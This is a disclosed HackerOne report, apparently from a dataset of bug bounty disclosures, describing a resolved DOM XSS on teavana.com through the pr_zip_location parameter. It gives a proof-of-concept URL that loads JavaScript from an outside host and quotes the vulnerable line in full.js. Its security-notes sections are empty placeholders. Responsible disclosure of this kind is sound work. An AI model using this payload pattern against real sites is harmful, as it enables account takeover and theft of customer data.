---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '209736'
original_report_id: '209736'
title: DOM XSS on teavana.com via "pr_zip_location" parameter
weakness: Cross-site Scripting (XSS) - Generic
team_handle: starbucks
created_at: '2017-03-01T00:57:21.852Z'
disclosed_at: '2017-05-03T13:33:55.922Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 15
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# DOM XSS on teavana.com via "pr_zip_location" parameter

## Metadata

- HackerOne Report ID: 209736
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: starbucks
- Disclosed At: 2017-05-03T13:33:55.922Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello Starbucks team,,

I've discovered DOM XSS on `teavana.com` involving `pr_zip_location` URL parameter. PoC:

http://www.teavana.com/us/en/tea/green-tea/winterberry-tea-blend-32601.html?pr_zip_location=//whitehat-hacker.com/xss.j?

Works in all major browsers. Vulnerable code is in `full.js`:

```js
var DR = Z(DS) + "/content/" + k(DQ) + "/contents.js";
```

That allows to execute absolutely arbitrary javascript in the context on `teavana.com` domain. As described in #202011 that directly leads to theft of customer account data and account takeover, hence I set severity to Critical.

Also, I have discovered a number of other XSS attacks on similar pages, involving other parameters and sinks. Should I submit them all as individual bug reports?

Thanks.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
